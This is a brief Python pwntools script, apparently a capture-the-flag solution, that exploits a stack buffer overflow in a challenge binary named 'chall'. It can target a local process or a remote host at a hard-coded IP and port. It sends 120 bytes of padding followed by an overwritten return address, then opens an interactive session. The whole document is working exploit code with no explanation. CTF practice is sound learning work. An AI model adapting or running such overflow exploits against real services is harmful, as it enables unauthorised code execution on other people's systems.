from pwn import *
import sys

argc = len(sys.argv)
if argc >= 2 and '-r' in sys.argv[1]:
    p = remote("34.84.136.181", 4000)
else:
    p = process("./chall")

p.recvuntil(">")

offset = b"A"*120
addr = p64(0x4011d6)
payload = offset + addr

p.send(payload)
p.interactive()

